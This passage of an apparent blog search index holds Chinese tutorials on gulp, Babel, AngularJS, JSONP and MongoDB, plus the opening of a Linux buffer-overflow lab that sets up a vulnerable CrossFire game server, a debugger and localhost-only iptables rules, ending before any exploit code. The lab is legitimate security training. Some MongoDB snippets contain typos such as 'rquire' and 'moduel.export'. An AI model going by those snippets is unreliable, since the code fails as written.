&#125;));&#125;);//注册自动刷新任务//监听任务gulp.task(&apos;watch&apos;,function()&#123; // 监听 html gulp.watch(&apos;src/**/*.html&apos;, [&apos;html&apos;]) // 监听 sacss gulp.watch(&apos;src/sass/*.sass&apos;, [&apos;sass&apos;]); // 监听 images gulp.watch(&apos;src/images/**/*.&#123;png,jpg,gif,svg&#125;&apos;, [&apos;images&apos;]); // 监听 js gulp.watch(&apos;src/js/*.js&apos;, [&apos;script&apos;]);&#125;);//sass编译任务gulp.task(&apos;sass&apos;, function()&#123; //插件提供4种输出格式： //nested：嵌套缩进的css代码，它是默认值 //expanded：没有缩进的、扩展的css代码。 //compact：简洁格式的css代码。 //compressed：压缩后的css代码。 return sass(&apos;src/sass/*.sass&apos;, &#123;style:&apos;compact&apos;&#125;) //指示源文件路径、并进行文件匹配(style: &apos;compressed&apos;表示输出格式) .on(&apos;error&apos;, function(err)&#123; console.log(&apos;编译sass出错%s&apos;, err.message); &#125;) /*.pipe(postcss([autoprefixer(&#123; browsers:[&apos;last 2 versions&apos;], //主流浏览器的最新两个版本 //cascade:false //是否美化属性值 &#125;)]))*/ //.pipe(cssnano()) .pipe(gulp.dest(&apos;src/css&apos;)); //输出路径&#125;);//CSS的压缩配置任务gulp.task(&apos;minify-css&apos;, () =&gt; &#123; return gulp.src(&apos;src/sass/*.css&apos;) .pipe(gulp.dest(&apos;dist/css&apos;)) &#125;)//添加CSS3前缀任务gulp.task(&apos;css3-prefix&apos;,() =&gt;&#123; gulp.src(&apos;src/css/*.css&apos;) .pipe(postcss([autoprefixer(&#123; browsers: [&apos;last 5 versions&apos;], //主流浏览器的最新两个版本 cascade:true, //是否美化属性值 remove:true //去掉不必要的前缀 &#125;)])) .pipe(gulp.dest(&apos;dist/css&apos;));&#125;);//gulp脚本压缩任务gulp.task(&apos;script&apos;, () =&gt; &#123; return gulp.src(&apos;src/js/**/*.js&apos;) //指明源文件路径、并进行文件匹配 //gulp.src([&apos;src/js/*.js&apos;,&apos;!*.min.js&apos;]) //配置源文件路径、并进行文件匹配，排除.min.js后缀的文件 //.pipe(sourcemaps.init()) //执行sourcemaps //.pipe(changed(&apos;dist/js&apos;,&#123;extension:&apos;.js&apos;&#125;)) // 对比文件是否有过改动（此处填写的路径和输出路径保持一致）,只要有一个文件变化整个目录都会重新编译 //.pipe(rename(&#123;suffix:&apos;.min&apos;&#125;)) //后添加的配置，进行重命名 .pipe(uglify(&#123;preserveComments:&apos;some&apos;&#125;)) //使用uglify进行压缩，并保留部分注释 //.pipe(sourcemaps.write(&apos;maps&apos;)) //地图输出路径(存放的位置) .pipe(gulp.dest(&apos;dist/js&apos;)); //输出路径&#125;);//gulp文件合并任务gulp.task(&apos;concat&apos;, () =&gt; &#123; gulp.src(&apos;dist/js/*.min.js&apos;) //要合并的文件 .pipe(concat(&apos;libs.js&apos;)) //合并成libs.js .pipe(gulp.dest(&apos;dist/js&apos;));&#125;)gulp.task(&apos;clean&apos;, () =&gt; &#123; gulp.src([&apos;dist/js/*.min.js&apos;], &#123;read:false&#125;) .pipe(clean());&#125;);//gulp图片压缩任务gulp.task(&apos;images&apos;, () =&gt; &#123; return gulp.src(&apos;src/images/**/*.&#123;png,jpg,gif&#125;&apos;) //指明源文件路径、并进行文件匹配 .pipe(imagemin(&#123; progressive:true, //无损压缩JPG图片 svgoPlugins:[&#123;removeViewBox:false&#125;], //不移除svg的viewbox属性 use:[pngquant()] //使用pngquant插件进行深度压缩 &#125;)).pipe(gulp.dest(&apos;dist/images&apos;)); ////输出路径&#125;);//发布静态页面到dist目录中gulp.task(&apos;html&apos;, function()&#123; return gulp.src(&apos;src/**/*.html&apos;) //指示文件路径、并进行文件匹配 .pipe(gulp.dest(&apos;dist&apos;)); // 输出路径&#125;);//默认任务gulp.task(&apos;default&apos;,[&apos;script&apos;,&apos;minify-css&apos;,&apos;html&apos;,&apos;webserver&apos;,&apos;watch&apos;]);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ES6(16)Gulp+Babel转码ES6]]></title>
      <url>%2F2017%2F01%2F10%2FGulp%2BBabel%E8%BD%AC%E7%A0%81ES6%2F</url>
      <content type="text"><![CDATA[0x00 安装插件1234567891011121314安装全局 Gulpnpm install -g gulp安装项目中使用的 Gulpnpm install --save-dev gulp安装 Gulp 上 Babel 的插件npm install --save-dev gulp-babel安装 Babel 上将 ES6 转换成 ES5 的插件npm install --save-dev babel-preset-es2015安装 Gulp 上 uglify 压缩插件npm install --save-dev gulp-uglify 0x01 Gulp 配置1234567891011121314151617181920212223242526272829303132333435363738在项目根目录新建 .babelrc ，内容为：&#123; &quot;presets&quot;: [&quot;es2015&quot;]&#125;在项目根目录新建 gulpfile.js，内容为：var gulp = require(&quot;gulp&quot;);var babel = require(&quot;gulp-babel&quot;); // 用于ES6转化ES5var uglify = require(&apos;gulp-uglify&apos;); // 用于压缩 JS// ES6转化为ES5// 在命令行使用 gulp toes5 启动此任务gulp.task(&quot;toes5&quot;, function () &#123; return gulp.src(&quot;src/js/**/*.js&quot;)// ES6 源码存放的路径 .pipe(babel()) .pipe(gulp.dest(&quot;dist&quot;)); //转换成 ES5 存放的路径&#125;);// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task(&apos;min&apos;, function() &#123; // 1. 找到文件 gulp.src(&apos;dist/*.js&apos;) // 2. 压缩文件 .pipe(uglify()) // 3. 另存压缩后的文件 .pipe(gulp.dest(&apos;min/js&apos;))&#125;);// 自动监控任务// 在命令行使用 gulp auto 启动此任务gulp.task(&apos;auto&apos;, function () &#123; // 监听文件修改，当文件被修改则执行 script 任务 gulp.watch(&apos;src/js/**/*.js&apos;, [&apos;toes5&apos;]); gulp.watch(&apos;dist/*.js&apos;, [&apos;min&apos;]);&#125;);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端之坑(1)之原生JavaScript]]></title>
      <url>%2F2017%2F01%2F05%2F%E5%89%8D%E7%AB%AF%E4%B9%8B%E5%9D%91(1)%E4%B9%8B%E5%8E%9F%E7%94%9FJavaScript%2F</url>
      <content type="text"><![CDATA[0x00 原生JavaScript 0x00 undefined &amp;&amp; nullJS 定义了两个特别的值，undefined 和 null。当试图读取没有赋值的变量或试图取不存在的对象属性时会返回 undefined。 而对于 null，好吧，这是个神奇的符号，它可以是基本的值 null,也可以是对象 null,它是 JS 原型链的顶层，所有的对象都是在它之下衍生出来的，它无处不在又变化多端，所以在此只记录其与 undefined 的区别。 由于 JS 的强制类型转换，下布尔环境中，null 与 undefined 都会被转换为 fasle。 所以，有时会遇到如下情况: 12console.log( null == undefined);// true 所以，并不是说 null 和 undefinde 是相等，只是它们都被转换为了布尔值. 12console.log( null === undefined);// false 但是多数情况下，我们并不关心一个值到底是 null 还是 undefined ，因为这两种情况我都需要排除掉，那么这时可以使用 if 语句和否定运算符 (!) : 123if(!myData.name)&#123; //do something&#125;; 0x01 DOM 操作 0x00 element.style.height对于 element.style.height 只能在 div 在行内样式设置了 height 才能读取,如果 height 值不写在行内样式（即是若没有在 html 和用 js 设置 height 时），style.height为 undefind，无法获取； 所以在需要获得元素的高度时,推荐使用 ele.offsetHeight。 同样 ele.style.width 存在同样的问题。 不定期更新。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(0)极速入门]]></title>
      <url>%2F2017%2F01%2F03%2FAngularJS(0)%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8%2F</url>
      <content type="text"><![CDATA[0x00 内置指令AngularJS 指令是扩展的 HTML 属性，带有前缀 ng。 ng-app初始化一个 Angular 应用程序 ng-init初始化应用程序数据。通常情况下，不使用 ng-init。而是使用一个控制器或模块来代替它。 ng-model指令把元素值（比如输入域的值）绑定到应用程序。 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html ng-app&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div ng-init=&quot;name=&apos;Jack&apos;&quot;&gt; &lt;input type=&quot;text&quot; ng-model=&quot;name&quot;&gt; &lt;p&gt;&lt;b&gt;&#123;&#123;name&#125;&#125;&lt;/b&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;../angular.js&quot;&gt;&lt;/script&gt;&lt;/html&gt; 如上， 表达式是一个 AngularJS 数据绑定表达式。 通过 ng-model = &quot;name&quot; 进行同步。 ng-repeat重复一个 HTML 元素： 123456789&lt;!--ng-repeat--&gt; &lt;div ng-init=&quot;arr=[&apos;first&apos;, &apos;second&apos;, &apos;third&apos;]&quot;&gt; &lt;p&gt;循环对象&lt;/p&gt; &lt;ul&gt; &lt;li ng-repeat=&quot;x in arr&quot;&gt; &#123;&#123;x&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; 0x01 自定义指令 AngularJS 内置的指令外，我们还可以使用 .directive 来创建自定义指令。 .directive使用驼峰法来命名一个指令， myDirective, 但在使用它时需要以 - 分割, my-directive: 要调用自定义指令，HTML 元素上需要添加自定义指令名。 123456789101112&lt;div ng-app=&quot;myApp&quot;&gt; &lt;my-directive&gt;&lt;/my-directive&gt;&lt;/div&gt; &lt;script&gt; var app = angular.module(&quot;myApp&quot;, []) app.directive(&quot;myDirective&quot;, function () &#123; return &#123; template: &quot;&lt;h1&gt;自定义指令&lt;/h1&gt;&quot; &#125; &#125;) &lt;/script&gt; 你可以通过以下方式来调用指令： 元素名 [E]: &lt;my-directive&gt;&lt;/my-directive&gt; 属性 [A]: &lt;div my-directive&gt;&lt;/div&gt; 类名 [C]: &lt;div class=&quot;my-directive&quot;&gt;&lt;/div&gt; 注释 [M]: &lt;!-- directive: my-directive --&gt; restrict如下，我们可以使用限制指令 resrict 规定只能以某种特性的方式调用. 1234return &#123; restrict: &quot;A&quot;, template: template: &quot;&lt;h1&gt;自定义指令&lt;/h1&gt;&quot;&#125; restrict 默认值为 EA, 即可以通过元素名和属性名来调用指令。 0x02 ng-model 指令ng-model 指令用于绑定应用程序数据到 HTML 控制器(input, select, textarea)的值。 12345678910111213&lt;div ng-app=&quot;myApp&quot; ng-controller=&quot;myCtrl&quot;&gt; 名字: &lt;input ng-model=&quot;name&quot;&gt; &lt;h1&gt;你输入了: &#123;&#123;name&#125;&#125;&lt;/h1&gt; &lt;/div&gt; &lt;script&gt; var app = angular.module(&apos;myApp&apos;, []); app.controller(&apos;myCtrl&apos;, function($scope) &#123; $scope.name = &quot;John Doe&quot;; &#125;); &lt;/script&gt; &lt;p&gt;修改输入框的值，标题的名字也会相应修改。&lt;/p&gt; 0x03 控制器 ControllerAngularJS 应用程序被控制器控制。我们可以使用 ng-controller 指令定义控制器。 AngularJS 控制是一个由 JavaScript 创建的对象，所以其内部当然可以包含属性和方法。 1234567891011121314151617181920212223&lt;body&gt; &lt;div id=&quot;appBox&quot; ng-app=&quot;myApp&quot; ng-controller=&quot;personCtrl&quot;&gt; 姓: &lt;input type=&quot;text&quot; ng-model=&quot;firstName&quot;&gt; 名: &lt;input type=&quot;text&quot; ng-model=&quot;lastName&quot;&gt; &lt;br&gt; &lt;hr&gt; 姓名: &#123;&#123;sayName()&#125;&#125; &lt;/div&gt; &lt;script&gt; var app = angular.module(&apos;myApp&apos;, []); app.controller(&apos;personCtrl&apos;, function($scope) &#123; $scope.firstName = &quot;马&quot;; $scope.lastName = &quot;云&quot; $scope.sayName = function () &#123; return $scope.firstName + $scope.lastName; &#125; &#125;); &lt;/script&gt; &lt;p&gt;在输入框的值，名字也会同步显示。&lt;/p&gt;&lt;/body&gt; 如上, ng-app 定义了一个 AngularJS 应用程序，该程序运行在 div#appBox 中，并使用 ng-controller 定义了一个控制器。 当然，在大型项目中，都是将应用程序存放在外部文件中的，然后再在 app.html 中引入就行了: 12345678910111213141516171819202122232425// personControl.js /** * Created by onejustone on 2017/1/4. */angular.module(&apos;myApp&apos;, []) .controller(&apos;personCtrl&apos;, function ($scope) &#123; $scope.firstName = &apos;马&apos; $scope.lastName = &apos;云&apos; $scope.sayName = function () &#123; return $scope.firstName + $scope.lastName &#125;&#125;)// index.html&lt;body&gt;&lt;div ng-app=&quot;myApp&quot; ng-controller=&quot;personCtrl&quot;&gt; 姓: &lt;input type=&quot;text&quot; ng-model=&quot;firstName&quot;&gt; 名: &lt;input type=&quot;text&quot; ng-model=&quot;lastName&quot;&gt; &lt;br&gt; &lt;hr&gt; 姓名: &#123;&#123;sayName()&#125;&#125;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;../controllers/personController.js&quot;&gt;&lt;/script&gt; 0x04 过滤器 Filter过滤器可以使用一个 管道字符 ( | ) 添加到表达式和指令中。 Angular 过滤器可以转换数据，下面是其内置的几种过滤器: currency: 格式化数字为货币格式。 filter: 从数组项中选择一个子集。 lowercase: 格式化字符串为小写。 uppercase: 格式化字符串为大写。 orderBy: 根据某个表达式排列数组。 来看看下面的例子: 12345678910111213141516// index.html&lt;div ng-app=&quot;myApp&quot; ng-controller=&quot;myCtrl&quot;&gt; &lt;input type=&quot;text&quot; ng-model=&quot;test&quot;&gt; &lt;p ng-repeat=&quot;x in names | filter:test | orderBy:country&quot;&gt; &#123;&#123;(x.name | uppercase) + x.country&#125;&#125; &lt;/p&gt;&lt;/div&gt;&lt;script src=&quot;../controllers/myController.js&quot;&gt;&lt;/script&gt;// myController.jsangular.module(&apos;myApp&apos;, []) .controller(&apos;myCtrl&apos;, function ($scope) &#123; $scope.names = [&#123;name:&apos;Jani&apos;,country:&apos;Norway&apos;&#125;, &#123;name:&apos;Hege&apos;,country:&apos;Sweden&apos;&#125;, &#123;name:&apos;Kai&apos;,country:&apos;Denmark&apos;&#125;]&#125;) 0x05 模块 Module我们可以把模块看作一个容器，模块定义了一个应用程序，而这个应用程序是模块中不同部分的容器。 所以，可以把控制器也看作是模块的一部分，那么我们自然也可以把控制器与模块与拆开： 123456789101112&lt;body&gt; &lt;div ng-app=&quot;myApp&quot; ng-controller=&quot;myCtrl&quot;&gt; &lt;input type=&quot;text&quot; ng-model=&quot;test&quot;&gt; &lt;p ng-repeat=&quot;x in names | filter:test | orderBy:country&quot;&gt; &#123;&#123;(x.name | uppercase) + x.country&#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;../controllers/myApp.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;../controllers/myController.js&quot;&gt;&lt;/script&gt; 注意 myApp.js 与 myController.js 的引入顺序。 12345// myApp.js/** * Created by onejustone on 2017/1/4. */var myApp = angular.module(&quot;myApp&quot;, []) 在模块定义中 [] 参数用于定义模块的依赖关系。中括号 [] 表示该模块没有依赖，如果有依赖的话会在中括号写上依赖的模块名字。 123456// myController.jsmyApp.controller(&apos;myCtrl&apos;, function ($scope) &#123; $scope.names = [&#123;name:&apos;Jani&apos;,country:&apos;Norway&apos;&#125;, &#123;name:&apos;Hege&apos;,country:&apos;Sweden&apos;&#125;, &#123;name:&apos;Kai&apos;,country:&apos;Denmark&apos;&#125;] &#125;) 0x06 依赖注入Angular 使用以下五个核心组件来实现依赖注入: value： Value 是一个简单的 javascript 对象，用于向控制器传递值（配置阶段）： factory：是一个函数用于返回值。在 service 和 controller 需要时创建。通常我们使用 factory 函数来计算或返回值。 provider: AngularJS 中通过 provider 创建一个 service、factory等(配置阶段)。 service: constant: constant(常量)用来在配置阶段传递数值，注意这个常量在配置阶段是不可用的。 0x07 路由AngularJS 路由允许我们通过不同的 URL 访问不同的内容。而正是得益于路由功能，才能让我们实现多视图的单页 Web 应用（single page web application，SPA）。 值得注意的是，通常我们的 URL 形式为 http://onejustone.xyz/first/page，但在单页 Web 应用中 AngularJS 通过 # + 标记 实现，如: http://onejustone.xyz/#/first]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(6)JSONP]]></title>
      <url>%2F2017%2F01%2F02%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(6)JSONP%2F</url>
      <content type="text"><![CDATA[0X00 JSONPJSOP 是 JSON with padding (填充式 json 或者 参数式 json 的缩写)，是应用 json 的一种新方法。 JSONP 只不过是被包含在函数调用中的 JSON。 JSONP 由两部分组成: 回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数，而回调函数的名字一般是在请求中指定的。而数据就是传入的 JSON 数据。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux缓冲区溢出]]></title>
      <url>%2F2017%2F01%2F01%2FLinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
      <content type="text"><![CDATA[0x00 前言其实无论是 Windows 还是 Linux ，当我们对目标进行渗透的时候针对的都是运行目标系统上的软件的，而不是 OS 本身的系统级别的漏洞，那太牛逼了，这事儿应该是 FBI 或者 NAS 玩儿的。 0x01 Linux 下的环境准备 目标软件: CrossFire（穿越火线）,一款在线多人 RPG 游戏，其 1.9.0 版本的服务端接受入站 socket 连接(客户端向服务器发起连接)时存在缓冲区溢出漏洞 调试工具： edb 运行平台: Kali i486(CPU 32位)(不是 64 位的Kali哦！) 我们选择 Kali i486 目标是，32 位 CPU 的最大寻址空间是 2^32 次方，而 64 位是 2^64 次方，差的不是一点点啊。 安装 CrossFire因为 CrossFire 是一个游戏软件，而在 Linux 系统中是所有游戏都有一个指定的存放目录 /usr/games 下: 1234567891011121314151617root@kali:~/Desktop# mv crossfire.tar.gz /usr/games/root@kali:~/Desktop# cd /usr/games/root@kali:/usr/games# tar zxpf crossfire.tar.gz root@kali:/usr/games# cd crossfire/root@kali:/usr/games/crossfire# lsbin etc lib man share varroot@kali:/usr/games/crossfire# cd bin/root@kali:/usr/games/crossfire/bin# ./crossfire// 执行 crossfire 文件，以运行软件// 看到如下信息，代表运行成功Waiting for connections...root@kali:~# netstat -pantu// 通过 netstat 命令，查看 corssfire 运行在哪个端口上Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:13327 0.0.0.0:* LISTEN 2766/./crossfire 我们主要针对该游戏服务器端的下的 crossfire/bin/crossfire 文件。 打开 Kali 中 edb 调试工具，在 Appicaiton -&gt; Reverse Engineering 中。 可以看到，其操作界面与 Windows 平台下的 Debugger 相差无几。 Linux 内核的保护机制于 Windows 一样,Linux 也具有自己的内存保护机制，比如 DEP，ASLR，堆栈cookies，堆栈粉碎等等。 配置防火墙设置仅本机访问我们在自己的计算机上运行一个具有缓冲区漏洞的软件，而当我们暴露在网络中时，这样很有可能会导致我们自己被而已利用。 下面，我们将对 Linux 自带的 Iptables 防火墙添加对应的规则，规定只要本机才可以访问 13327 端口: 1234root@kali:~# iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP// 为 crossfire 增加规则root@kali:~# iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP// 4444 端口为后续的 shellcode 做准备 使用 iptables -L 查看防火墙配置是否生效： 12345root@kali:~# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination DROP tcp -- anywhere !localhost tcp dpt:13327DROP tcp -- anywhere !localhost tcp dpt:4444 0x02 开始调试]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Glup(1)]]></title>
      <url>%2F2016%2F12%2F31%2FGlup%2F</url>
      <content type="text"><![CDATA[0x00 What’s GulpGulp 是基于流的自动化构建工具。 开发者可以使用它在项目开发过程中自动执行常见任务。Gulp.js 是基于 Node.js 构建的，利用 Node.js 流的威力，你可以快速构建项目并减少频繁的 IO 操作。Gulp.js 源文件和你用来定义任务的 Gulp 文件都是通过 JavaScript（或者 CoffeeScript ）源码来实现的。 Gulp 是基于流的，Gulp 对文件的操作就像水管之于水流，水流流经水管，水管将水水流改变成不同的形状。 0x01 基于流的 Gulp何为 流,请参考: 安装 glup: http://www.gulpjs.com.cn/docs/getting-started/ 我们来看看 Gulp 是如何控制和操作流的: 1234567891011121314&apos;use strict&apos;var gulp = require(&apos;gulp&apos;)gulp.task(&apos;sync1&apos;, function () &#123; console.log(&quot;I am a sync task&quot;)&#125;)gulp.task(&apos;async&apos;, function (done) &#123; setTimeout(function () &#123; console.log(&quot;I am a async task&quot;) done() &#125;, 2000)&#125;) 我们可以看到，GUlp 是以任务开始的，gulp.task 可以定义一个任务，然后在命令行下使用 gulp 任务名 就可以执行对应的任务了: 123456789101112D:\blogλ gulp sync1[10:30:07] Using gulpfile D:\blog\gulpfile.js[10:30:07] Starting &apos;sync1&apos;...I am a sync task[10:30:07] Finished &apos;sync1&apos; after 724 μsD:\blogλ gulp async[10:30:14] Using gulpfile D:\blog\gulpfile.js[10:30:14] Starting &apos;async&apos;...I am a async task[10:30:16] Finished &apos;async&apos; after 2 s Gulp 的任务可以是同步和异步，在异步任务中确定任务完成，可以通过调用函数参数 done() 来实现。 此外，gulp.task 可以有依赖，只要第二个参数传入一个数组，中间加上依赖的任务就行了，而数组里面的这些任务是并行处理的，不会一个执行完才执行另一个（同步任务的输出比异步任务的结束早）。 123456789101112131415161718192021222324252627282930&apos;use strict&apos;var gulp = require(&apos;gulp&apos;)var through = require(&apos;through2&apos;)gulp.task(&apos;sync1&apos;, function () &#123; console.log(&apos;i am a sync&apos;)&#125;)gulp.task(&apos;sync2&apos;, function () &#123; console.log(&apos;i am a second sync&apos;)&#125;)gulp.task(&apos;sync3&apos;, function () &#123; console.log(&apos;i am a third sync&apos;)&#125;)gulp.task(&apos;async&apos;, function (done) &#123; console.log(&apos;ready...&apos;) setTimeout(function () &#123; console.log(&apos;Fire!&apos;) done() &#125;, 2000)&#125;)gulp.task(&apos;asyncs&apos;, [&apos;async&apos;, &apos;sync1&apos;, &apos;sync2&apos;, &apos;sync3&apos;], function (done) &#123; console.log(&apos;ok, task all done&apos;) done()&#125;) 如上，我们组合了多个任务,以通过 gulp 依赖进行了并行处理: 12345678910111213141516171819D:\blogλ gulp asyncs[11:04:40] Using gulpfile D:\blog\gulpfile.js[11:04:40] Starting &apos;async&apos;...ready...[11:04:40] Starting &apos;sync1&apos;...i am a sync[11:04:40] Finished &apos;sync1&apos; after 545 μs[11:04:40] Starting &apos;sync2&apos;...i am a second sync[11:04:40] Finished &apos;sync2&apos; after 291 μs[11:04:40] Starting &apos;sync3&apos;...i am a third sync[11:04:40] Finished &apos;sync3&apos; after 207 μsFire![11:04:42] Finished &apos;async&apos; after 2 s[11:04:42] Starting &apos;asyncs&apos;...ok, task all done[11:04:42] Finished &apos;asyncs&apos; after 240 μs 0x02 I/O 处理除了以上的基本任务模式。对于每个 task, Gulp 通常通常用来操作文件输入和输出流，因此 Gulp 封装了批量操作文件流的 API： 12345678&apos;use strict&apos;let gulp = require(&apos;gulp&apos;)gulp.task(&apos;src-dist&apos;, function () &#123; gulp.src(&quot;./*.js&quot;) .pipe(gulp.dest(&apos;./public&apos;))&#125;) 上面的命令表示将当前目录下所有的 .js 文件匹配出来，依次输出到目标文件夹 ./public 中去。 更高级一点，还可以将当前目录及其所有子目录中的文件提取出来: 12345678&apos;use strict&apos;let gulp = require(&apos;gulp&apos;)gulp.task(&apos;src-dist&apos;, function () &#123; gulp.src(&quot;./**/*.js&quot;) .pipe(gulp.dest(&apos;./public&apos;))&#125;) 0x03 Gulp 技巧下面一个在开发环境中能够用到的 gulpfile.js 配置: 12345678910111213141516171819202122232425262728293031323334353637383940414243var gulp=require(&quot;gulp&quot;), webserver=require(&quot;gulp-webserver&quot;), livereload=require(&quot;gulp-livereload&quot;), sass=require(&quot;gulp-ruby-sass&quot;), uglify=require(&quot;gulp-uglify&quot;);// 注册任务：gulp.task(&quot;webserver&quot;,function()&#123; gulp.src(&apos;./dist&apos;).pipe(webserver(&#123; livereload:true, open:true &#125;))&#125;);// html任务：gulp.task(&quot;html&quot;,function()&#123; return gulp.src(&quot;src/**/*.html&quot;) .pipe(gulp.dest(&quot;dist&quot;)); //指明源文件路径并输出到发布环境&#125;);// sass任务：gulp.task(&quot;sass&quot;,function()&#123; return sass(&quot;src/sass/*.scss&quot;,&#123;style:&quot;compact&quot;&#125;) .on(&quot;error&quot;,function(err)&#123; console.log(&quot;编译出错&quot;,err.message); &#125;) .pipe(gulp.dest(&quot;dist/css&quot;))&#125;)// script压缩任务：gulp.task(&quot;script&quot;,function()&#123; return gulp.src(&quot;src/js/*.js&quot;) .pipe(uglify(&#123;preserveComment:&quot;some&quot;&#125;)) //压缩并保留注释 .pipe(gulp.dest(&quot;dist/js&quot;))&#125;)// 监听任务：gulp.task(&quot;watch&quot;,function()&#123; gulp.watch(&quot;*.html&quot;,[&quot;html&quot;]);&#125;);//默认执行任务：gulp.task(&quot;default&quot;,[&quot;sass&quot;,&quot;webserver&quot;,&quot;html&quot;,&quot;script&quot;,&quot;watch&quot;]); 更多的高级用法请参看官方文档。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从一个博客说起(2)Express路由]]></title>
      <url>%2F2016%2F12%2F30%2F%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E8%AF%B4%E8%B5%B7(2)Express%E8%B7%AF%E7%94%B1%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[从一个博客说起(3)使用MongoDB]]></title>
      <url>%2F2016%2F12%2F30%2F%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E8%AF%B4%E8%B5%B7(3)%E4%BD%BF%E7%94%A8MongoDB%2F</url>
      <content type="text"><![CDATA[0x00 关于 MongoDBMongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。 0x01 安装 MongoDB创建数据目录创建数据目录( \data\db )用于存放 MongoDB 数据： 123Path----D:\Git-Repository\NEMBlog\data\db 命令下运行 MongoDB 数据库服务为了从命令提示符下运行MongoDB服务器，你必须从MongoDB目录的 bin 目录中执行 mongod.exe 文件。 1C:\Program Files\MongoDB\Server\3.4\bin\mongod.exe --dbpath D:\Git-Repository\NEMBlog\data\db 当然，每次都这么运行的话，我会疯掉的，懒人 Tips : 在 PowerShell 中添加命令别名，以快速获得启动的路径: 12function run-Mongod &#123;&quot;&apos;C:\Program Files\MongoDB\Server\3.4\bin\mongod.exe&apos; --dbpath D:\Git-Repository\NEMBlog\data\db&quot;&#125;Set-Alias mongod run-Mongod 如果执行成功，会输出如下信息： 1234567C:\Users\onejustoneλ &amp; &apos;C:\Program Files\MongoDB\Server\3.4\bin\mongod.exe&apos; --dbpath D:\Git-Repository\NEMBlog\data\db2017-01-20T11:39:55.542+0800 I CONTROL [initandlisten] MongoDB starting : pid=1420 port=27017 dbpath=D:\Git-Repository\NEMBlog\data\db 64-bit host=onejustone4042017-01-20T11:39:55.545+0800 I CONTROL [initandlisten] targetMinOS: Windows 7/Windows Server 2008 R22017-01-20T11:39:55.546+0800 I CONTROL [initandlisten] db version v3.4.02017-01-20T11:39:55.546+0800 I CONTROL [initandlisten] git version: f4240c60f005be757399042dc12f6addbc3170c12017-01-20T11:39:55.546+0800 I CONTROL [initandlisten] OpenSSL version: OpenSSL 1.0.1t-fips 3 May 2016 MongoDB后台管理 Shell如果你需要进入MongoDB后台管理，你需要先打开 mongodb 装目录的下的 bin 目录，然后执行 mongo.exe 文件，MongoDB Shell是MongoDB自带的交互式 Javascript shell,用来对MongoDB进行操作和管理的交互式环境。 默认连接 test 数据库: 123456λ mongoMongoDB shell version v3.4.0connecting to: mongodb://127.0.0.1:27017&gt; dbtest 0x02 使用 Node.js 连接 MongonDB 数据库首先需要官方提供的 node-mongodb-native 驱动模块，在 package.json 文件的 dependencies 自动添加依赖: 123 &quot;dependencies&quot;: &#123; &quot;mongodb&quot;: &quot;*&quot;,&#125; 运行 npm install 等待模块下载完成。 然后在工程根目录中创建 settings.js 文件，用于保存工程的配置信息，比如，数据库连接信息: 123456moduel.export = &#123; db: &apos;db&apos;, // db ：代表数据库名称 host: &apos;localhost&apos; // host: 数据库地址&#125; 接着在工程根目录下创建 models 文件夹，并在该文件夹中新建 db.js 文件: 12345678910111213141516/** * Created by onejustone on 2017/1/18. */var settings = rquire(&apos;../settings&apos;), Db = require(&apos;mongodb&apos;).Db, Connection = rquire(&apos;mongodb&apos;).Connection, Server = rquire(&apos;mongodb&apos;).Server;module.exports = new Db(settings.db, new Server(settings.host, Connection.DEFAULT_PORT, &#123;&#125;),&#123;safe: true&#125; // 创建一数据库连接实例，并通过 module.exports 导出该实例 // 设置数据库名，数据库地址，数据库端口 ); 如上，我们创建了一个数据库连接实例，以后便可以通过 require 来对该数据库进行读写操作了。 0x03 添加 Session 会话支持运行 npm install express-session 安装 session ， 等待依赖模块安装完成。然后在 app.js 的 var path = require(‘path’) 后添加如下代码: 123var session = require(&apos;express-session&apos;);var MongoStore = require(&apos;connect-mongo&apos;)(session);var settings = require(&apos;./settings&apos;); 在 app.use(cookieParser()); 后添加如下代码: 123456789app.use(cookieParser());app.use(session(&#123; secret: settings.cookieSecret, key: settings.db, // cookie name cookie: &#123;maxAge: 1000*60*60*24*30&#125;, // 30days store: new MongoStore(&#123; url: &apos;mongodb://localhost/&apos; + settings.db, &#125;)&#125;)); 如上，cookieParse() 是用来解析 Cookie 的中间件。而 express.session 则用来提供会话支持，secret 用于防止篡改 Cookie，key 是 Cookie 的名字,maxAgae 设置 Cookie 的生命周期为 30 天。设置其 store 参数为 MongoStroe 实例，把会话信息存储到数据库中。 好吧，Express 升级到 4.x 后全是坑，我也会醉了。。。 最后，推荐使用, supervisor , 安装命令: npm install supervisor ，以此便于调试，以后每次修改代码，直接刷新浏览器就行，无需再次重启服务。 